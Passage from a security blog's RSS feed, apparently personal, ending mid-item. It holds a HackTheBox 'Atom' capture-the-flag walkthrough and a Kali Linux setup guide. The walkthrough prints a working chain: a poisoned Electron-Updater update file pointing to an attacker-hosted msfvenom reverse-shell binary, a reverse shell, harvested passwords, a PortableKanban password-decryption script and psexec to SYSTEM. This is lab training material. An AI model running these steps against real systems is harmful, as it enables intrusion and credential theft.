<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check of the new version of binary file.</p>
<pre><code>execFile(&quot;powershell.exe&quot;, [&quot;-NoProfile&quot;, &quot;-NonInteractive&quot;, &quot;-InputFormat&quot;, &quot;None&quot;, &quot;-Command&quot;, `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
...&lt;SNIP&gt;...
</code></pre><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious update definition that will pop a calculator.</p>
<pre><code>version: 2.0.0
path: u';calc;'pdate.exe
sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
releaseDate: '2021-01-24T13:44:59.064Z'
</code></pre><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
<pre><code>`Get-AuthenticodeSignature 'u';payload;'pdate.exe' | ConvertTo-Json -Compress`
</code></pre><p>Now that if a single quote <code>'</code> is added to <code>path</code>, which becomes:</p>
<pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
</code></pre><p>But then, it would breaks the signature verification.</p>
<p>And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.49 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span> -f exe -o i<span style="color:#ae81ff">\&#39;</span>amf.exe
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span style="color:#ae81ff">460</span> bytes
Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
Saved as: i<span style="color:#960050;background-color:#1e0010">&#39;</span>amf.exe
</code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ shasum -a <span style="color:#ae81ff">512</span> i<span style="color:#ae81ff">\&#39;</span>amf.exe | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1 | xxd -r -p | base64 | tr -d <span style="color:#e6db74">&#39;\n&#39;</span>
Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span style="color:#f92672">==</span>
</code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<pre><code>version: 2.0.1
path: http://10.10.14.83/i'amf.exe
sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==
releaseDate: '2021-01-24T13:44:59.064Z'
</code></pre><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates -c &#34;put iamf-update.yml client1/latest.yml&#34;  &amp;&amp; nc -nvlp 53
putting file iamf-update.yml as \client1\latest.yml (1.1 kb/s) (average 1.1 kb/s)
listening on [any] 53 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami
whoami
atom\jason

C:\WINDOWS\system32&gt;
</code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
</p>
<p>User flag is done here.</p>
<pre><code>C:\Users\jason\Desktop&gt;type user.txt
type user.txt
b77e754354e186f...&lt;SNIP&gt;...
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
[+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM
</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp (I&rsquo;ve not been able to pwn it, though 😂).  Its config contains encrypted Redis database password (The clear password revealed in the next section).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
type PortableKanban\PortableKanban.cfg
{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
type redis.windows.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
type redis.windows-service.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ rlwrap nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>redis<span style="color:#f92672">)</span> open
AUTH jason kidvscat_electron_@123
-ERR wrong number of arguments <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;auth&#39;</span> command
AUTH kidvscat_electron_@123
-ERR invalid password
AUTH kidvscat_yes_kidvscat
+OK
</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">INFO
$1938
# Server
redis_version:3.0.504
...&lt;SNIP&gt;...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
</code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">SELECT 0
+OK
KEYS *
*4
$48
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$11
pk:ids:User
$20
pk:ids:MetaDataClass
$57
pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$207
{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">from base64 import b64decode
import sys
import des 

key <span style="color:#f92672">=</span> des.DesKey<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#39;7ly6UznJ&#39;</span><span style="color:#f92672">)</span>
iv <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#39;XuVUm5fR&#39;</span>

try:    
	passwd <span style="color:#f92672">=</span> b64decode<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.encode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
except IndexError:
	print<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span>
    
	sys.exit<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>

dec_password <span style="color:#f92672">=</span> key.decrypt<span style="color:#f92672">(</span>passwd, initial<span style="color:#f92672">=</span>iv, padding<span style="color:#f92672">=</span>True<span style="color:#f92672">)</span>
print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UTF-8&#39;</span><span style="color:#f92672">))</span>
</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «atom» «10.10.14.83»
$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted Password: kidvscat_admin_@123
</code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «atom» «10.10.14.49» 
$ impacket-psexec atom/administrator:&#39;kidvscat_admin_@123&#39;@10.10.10.237
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.237.....
[*] Found writable share ADMIN$
[*] Uploading file FCSITnEj.exe
[*] Opening SVCManager on 10.10.10.237.....
[*] Creating service DCLl on 10.10.10.237.....
[*] Starting service DCLl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami &amp;&amp; hostname
nt authority\system
ATOM

C:\WINDOWS\system32&gt;ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>My Kali Linux Setup for Playing HackTheBox</title>
      <link>https://fahmifj.github.io/blog/my-kali-linux-setup-for-playing-hackthebox/</link>
      <pubDate>Fri, 09 Jul 2021 07:45:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/my-kali-linux-setup-for-playing-hackthebox/</guid>
      <description>After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a weaponized version of Ubuntu , but because I like simplicity, I decided to use Kali again 😄 //slap.
In this post, I&amp;rsquo;d like to share my Kali Linux setup for playing HackTheBox. I guess it is applicable for TryHackMe, VulnHub or other boot2root platform, too (I hope).</description>
      <content:encoded><![CDATA[<p>After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a <em>weaponized</em> version of Ubuntu , but because I like simplicity, I decided to use Kali again 😄 <em>//slap</em>.</p>
<p>In this post, I&rsquo;d like to share my Kali Linux setup for playing HackTheBox. I guess it is applicable for TryHackMe, VulnHub or other boot2root platform, too (I hope).</p>
<h2 id="display-ip-address-in-prompt">Display IP Address in Prompt</h2>
<p>Adding IP address in your prompt would be really helpful as it lets you copy the IP faster for reverse shell. To do so, we&rsquo;ll need to modify the <code>.zshrc</code> file. But, before performing any modification, consider to make a backup of your original file using the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cp ~/.zshrc<span style="color:#f92672">{</span>,.bak<span style="color:#f92672">}</span> 
</code></pre></div><p>Also, I usually put any customization at the top of the <code>.zshrc</code> file wrapped between two comments, for example:</p>
<pre><code># START CUSTOM
...[custom script here]
# END CUSTOM
</code></pre><p>If all set, add the following function to your <code>.zshrc</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">function</span> get_ip<span style="color:#f92672">(){</span>
   <span style="color:#75715e"># It can be thm or htb IP</span>
   tunnel_ip<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>ifconfig tun0 2&gt;/dev/null | grep netmask | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#e6db74">`</span> 
   <span style="color:#75715e"># Use eth0 as default IP,</span>
   default_ip<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>ifconfig eth0 2&gt;/dev/null | grep netmask | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#e6db74">`</span>
   <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $tunnel_ip <span style="color:#f92672">==</span> *<span style="color:#e6db74">&#34;10.&#34;</span>* <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
      echo $tunnel_ip
   <span style="color:#66d9ef">else</span>
      echo $default_ip
   <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>Then, find the following lines:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...
<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span>$PROMPT_ALTERNATIVE<span style="color:#e6db74">&#34;</span> in
        twoline<span style="color:#f92672">)</span>
...
</code></pre></div><p>Under these lines,  replace the entire <code>PROMPT</code> variable with the following line:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PROMPT=$&#39;%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]-%B%F{152}[`get_ip`]%b%f%F{%(#.blue.green)}\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} &#39;
</code></pre></div><p>Reopen your terminal or type one of the following commands in the terminal.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ zsh
$ source ~/.zshrc
</code></pre></div><p>And done.</p>
<p><img class="img-container" src="imgs/image-20210709054914243.png" alt="image-20210709054914243"  />
</p>
<h2 id="openvpn-connection">OpenVPN Connection</h2>
<p>For VPN, it&rsquo;s tiring when you have to type <code>$ openvpn /path/to/config/file.ovpn</code> each time you want to connect to the HTB/THM network. To make thing easier, we can create a folder called <code>.ovpnconfig</code> in the home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir -p ~/.ovpnconfig
</code></pre></div><p>Then put all of your OpenVPN configuration files into this <code>.ovpnconfig</code> folder.</p>
<p><img class="img-container" src="imgs/image-20210709063528132.png" alt="image-20210709063528132"  />
</p>
<p>Finally, add some aliases into your <code>.zshrc</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">alias htbon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias htbfort<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias htbrel<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/htb-release.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias thmon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/thm.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias thmwreath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias kvpn<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pkill openvpn&#39;</span>
</code></pre></div><p>Now we can type <code>$ htbon</code> or <code>$ thmon</code> in the command prompt to connect to the VPN.  Want to turn off the VPN? Simply type <code>$ kvpn</code> !</p>
<p>In the newer Kali Linux, the only problem is that <code>openvpn</code> must be executed with <code>sudo</code> . Therefore, you&rsquo;ve to add the following <code>sudo</code> alias.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># Source: https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background
alias sudo=&#39;sudo -v; [ $? ] &amp;&amp; sudo &#39;
</code></pre></div><ul>
<li><code>sudo -v</code> will authenticate the user first.</li>
<li><code>[ $? ] &amp;&amp; sudo </code> will check if the previous command (separated by semi-colon) return with success (value of 0), if yes run <code>sudo</code> again.</li>
</ul>
<p>This time, we can run these aliases with sudo command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo &lt;alias-command&gt;
$ sudo htbon
$ sudo thmon
$ sudo kvpn
</code></pre></div><h2 id="tools-transfer">Tools Transfer</h2>
<p>Just like the OpenVPN files, I like to keep the essential tools to be centralized in one folder and so it can be hosted immediately. Again, we can create a folder called <code>tools</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir -p ~/tools
</code></pre></div><p>Put your tools inside the folder. The following are some of the tools that I think to be essential (including web-shell).</p>
<p><img class="img-container" src="imgs/image-20210709065944915.png" alt="image-20210709065944915"  />
</p>
<p>Next, add another alias to host these tools immediately with one command, feel free to create alias for yourself. Mine called <code>hostit</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">alias hostit<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;python3 -m http.server -d ~/tools 8000&#39;</span>
</code></pre></div><p>If you watch <a href="https://www.youtube.com/c/ippsec/videos">ippsec</a>, he prefers keeping the tools with the associated pwned machines (in <code>www</code> directory). So it&rsquo;s up to you.</p>
<h2 id="note-template">Note Template</h2>
<p>My current note template is available on <a href="https://github.com/fahmifj/HackTheBox-notes/tree/main/machines/note-template">GitHub</a>. I&rsquo;m using the following function to recreate the directory structure:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">function</span> mknote<span style="color:#f92672">(){</span>
  mkdir nmap gobuster loot logs exploits ssh-keys post-exploits
<span style="color:#f92672">}</span>
</code></pre></div><ul>
<li>
<p><strong>nmap:</strong> each nmap scan goes here.</p>
</li>
<li>
<p><strong>gobuster:</strong> each gobuster scan goes here.</p>
</li>
<li>
<p><strong>loot:</strong> each interesting file for further analysis goes here.</p>
</li>
<li>
<p><strong>logs:</strong> If you like to log your activity with <code>$ script</code> , put them here.</p>
</li>
<li>
<p><strong>exploits:</strong> exploit script goes here.</p>
</li>
<li>
<p><strong>ssh-keys:</strong> obtained ssh-key goes here, not loot.</p>
</li>
<li>
<p><strong>post-exploits:</strong> post-compromise loot goes here.</p>
</li>
</ul>
<p>Usage is simple:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd htb-machine-folder/
$ mknote
$ tree
.
├── exploits
├── gobuster
├── logs
├── loot
├── nmap
├── post-exploits
└── ssh-keys
</code></pre></div><h2 id="ssh-configuration">SSH Configuration</h2>
<p>I have always use a separate SSH keys for CTF. My SSH key for CTF is using ed25519. You can create one using the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh-keygen -a <span style="color:#ae81ff">100</span> -t ed25519 -f ~/.ssh/ctf_ssh
</code></pre></div><p>The command will creates two files: <code>ctf_ssh</code> and <code>ctf_ssh.pub</code>.</p>
<p>After that, register your private key to SSH agent.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ eval <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>ssh-agent -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
$ ssh-add ~/.ssh/ctf_ssh
</code></pre></div><p>Since HackTheBox machine starts with IP address of <code>10.10.*</code>, add these lines to your SSH config (<code>~/.ssh/config</code>). Create one if you don&rsquo;t have it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Host 10.10.*
  IdentityFile ~/.ssh/ctf_ssh
</code></pre></div><p>With the config above, whenever I injected my public key  (<code>/.ssh/ctf_ssh.pub</code>)  to HackTheBox machine for persistence access*, I can login by simply typing <code>$ ssh machine-name@hostname</code> or <code>$ ssh machine-name@ip</code>. I don&rsquo;t have to specify <code>-i /path/to/ssh/private/key</code> anymore.</p>
<blockquote>
<p>*Read more at <a href="https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/">Linux Backdoors</a> post.</p>
</blockquote>
<h2 id="qterminal-configuration">QTerminal Configuration</h2>
<p>Unfortunately I&rsquo;m not a tmux user here. Tmux is rich in features, but I&rsquo;m not comfortable with its prefix key. So far, I&rsquo;ve always used the default QTerminal application and leveraged its shortcut feature to &lsquo;navigate&rsquo; a slightly faster in terminal.</p>
<p>If you&rsquo;re a Windows Terminal user, you&rsquo;ll familiar with some of these shortcuts:</p>
<ul>
<li><strong><code>ALT + Arrows</code></strong>: Move cursor in subterminal</li>
<li><strong><code>CTRL + TAB</code></strong>: Navigate between tabs</li>
<li><strong><code>CTRL + Arrow Left</code></strong>:  Previous tab</li>
<li><strong><code>CTRL + Arrow Right</code></strong>: Next tab</li>
<li><strong><code>CTRL + N</code></strong> : New terminal tab</li>
<li><strong><code>CTRL + SHIFT + W</code></strong> : Close current subterminal</li>
<li><strong><code>CTRL + SHIFT + =</code></strong> : Split terminal vertically</li>
<li><strong><code>CTRL + SHIFT + -</code></strong> : Split terminal horizontally</li>
<li><strong><code>CTRL + SHIFT + F</code></strong> : Open search bar in terminal</li>
<li><strong><code>CTRL + =</code></strong> : Zoom in</li>
<li><strong><code>CTRL + -</code></strong> : Zoom out</li>
</ul>
<p>For me, the only limitation here is that there is no shortcut for resizing a subterminal.</p>
<h2 id="all-in-one-with-oh-my-zsh-plugin">All in One with Oh My Zsh Plugin</h2>
<p>If you&rsquo;re a <a href="https://ohmyz.sh/#install">Oh My Zsh</a> user like me, we can add these configuration (excluding SSH and QTerminal configurations) into a custom plugin.</p>
<p>Save the following script to  <code>/home/&lt;username&gt;/.oh-my-zsh/custom/plugins/ctf/ctf.plugin.zsh</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">function</span> get_ip<span style="color:#f92672">(){</span>
   <span style="color:#75715e"># It can be thm or htb IP</span>
   tunnel_ip<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>ifconfig tun0 2&gt;/dev/null | grep netmask | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#e6db74">`</span> 
   <span style="color:#75715e"># Use eth0 as default IP,</span>
   default_ip<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>ifconfig eth0 2&gt;/dev/null | grep netmask | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#e6db74">`</span>
   <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $tunnel_ip <span style="color:#f92672">==</span> *<span style="color:#e6db74">&#34;10.&#34;</span>* <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
      echo $tunnel_ip
   <span style="color:#66d9ef">else</span>
      echo $default_ip
   <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span>

<span style="color:#66d9ef">function</span> mknote<span style="color:#f92672">(){</span>
  mkdir nmap gobuster loot logs exploits ssh-keys dump post-exploits
<span style="color:#f92672">}</span>

<span style="color:#75715e"># https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background</span>
alias sudo<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;sudo -v; [ $? ] &amp;&amp; sudo &#39;</span>
